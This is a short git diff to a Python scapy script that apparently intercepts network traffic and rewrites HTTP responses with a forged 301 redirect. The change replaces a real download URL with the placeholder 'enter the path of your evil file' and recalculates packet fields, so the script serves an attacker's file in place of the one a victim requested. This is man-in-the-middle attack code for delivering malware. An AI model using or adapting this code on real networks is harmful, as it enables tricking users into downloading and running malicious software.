@@ -17,7 +17,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+]Replacing file")
                 scapy_packet[
-                    scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar602.exe\n\n"
+                    scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: (enter the path of your evil file)\n\n"
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
